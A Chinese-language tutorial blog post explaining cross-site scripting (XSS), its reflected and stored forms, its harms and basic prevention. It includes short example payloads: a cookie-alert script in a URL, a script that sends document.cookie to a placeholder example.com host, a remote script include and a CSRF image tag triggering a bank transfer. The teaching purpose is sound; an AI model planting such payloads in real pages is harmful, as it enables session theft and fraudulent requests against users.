---
title: 'XSS:跨站脚本攻击'
date: 2018-03-23 17:31:08
tags: ['网络安全']
---

在网络安全领域，有许多的安全问题值得我们去关注，网络安全本身就是一门很大的计算机学科。今天我们仅仅关注其中与web相关的一个安全问题：XSS。

# XSS?
XSS（Cross-Site Scripting），全称跨站脚本攻击。它是一种通过向HTML注入恶意代码执行，从而达到非法目的的攻击。一般这种XSS注入都比较隐蔽，需要通过检索代码才能发现（甚至有的代码是被混淆过的，就更隐蔽了）。

XSS牵扯到三个角色：攻击者、目标服务器、受害浏览器

# XSS类型
XSS主要有两种类型：反射型XSS和存储型XSS

### 1. 反射型XSS

反射型XSS又称非持久性XSS，主要依靠目标服务器返回结果给受害浏览器，从而受害浏览器执行恶意代码而被攻击。一般出现在错误信息反馈或搜索结果返回情况下。
通常受害者需要主动点击链接才会被攻击，因此是一次性的，所以叫非持久性XSS。

假设目标服务器是一个搜索网站，如果它不进行XSS预防，而直接将搜索条件返回，比如受害者点击如下链接：

```html
http://www.example.com?q=<script>alert(document.cookie);</script>
```

当目标服务器返回搜索结果，并将q值填入input框，受害浏览器就会执行script脚本，从而会将cookie信息暴露出来。

### 2. 存储型XSS

存储型XSS又称持久性XSS，它与反射型XSS最大不同在于，恶意代码是被永久存储在目标服务器中的。当受害者打开目标服务器网页时，目标服务器将恶意代码以网页内容返回，从而被攻击。
这种XSS的危害范围更大，隐蔽性更强，时间也长久，受害者很难防御。

一般UGC类网站需要特别关注这个问题。


# XSS危害

### 1. 窃取cookie

假设攻击者在页面中注入如下代码：

```html
<script>
    location.href = 'http://www.example.com?cookie=' + document.cookie;
</script>
```

此时受害浏览器跳转到指定链接，从而把cookie泄露。一旦cookie泄露后，攻击者就会伪造受害者请求，从而获得受害者权限从事非法操作，如果受害者拥有管理者权限，就更糟了。

### 2. 引导钓鱼

攻击者像网页写入如下脚本：

```html
<script src="www.example.com/aaa.js"></script>
```
在`aaa.js`中会生成一些表单form，引导你填写敏感数据，如账号密码等。当受害者当真了，就上当了。

因为XSS利用的是用户信任的网站，隐蔽性较高。

### 3. 跨站请求伪造

跨站请求伪造(Cross-Site Request Forgery, CSRF)是利用静态资源src属性，如图片、视频等资源，将请求伪装至src属性中。由于是信任网站发出的请求，会带上该网站的合法cookie，从而导致攻击：

```html
<img src="http://www.bank.com/transfer.do?toAccount=123456&money=10000"/>
```
以上会发起转账请求，由于是从目标网站发出，且带上了合法cookie，从而目标服务器信任这次请求。

### 4. 木马蠕虫注入

通过XSS可以很容易的在网页注入脚本后下载一些木马蠕虫等恶意软件。


# XSS预防

针对XSS类型，我们从两个源头进行预防：

### 1. 输入预防
从上面的XSS实施过程中可以看出，XSS主要通过注入一些标签来完成攻击，因此在输入端可以过滤掉这些敏感的字符，比如`<>` `script`等标签敏感期。对用户的输入做安全编码，如在提交表单前对value进行编码：
```js
encodeURIComponent(value)
```

或对用户的输入进行前端规则校验，如不允许输入特殊字符，限制字符数量类型等。

### 2. 存储预防

前端规则过滤只能防君子，不能防小人。目标服务器端也需要对用户提交的数据进行校验，如果出现非法字符，则直接报错或拒绝服务。


# XSS插件

推荐使用开源项目[XSS](https://www.npmjs.com/package/xss),或其他的xss项目预防此类攻击.

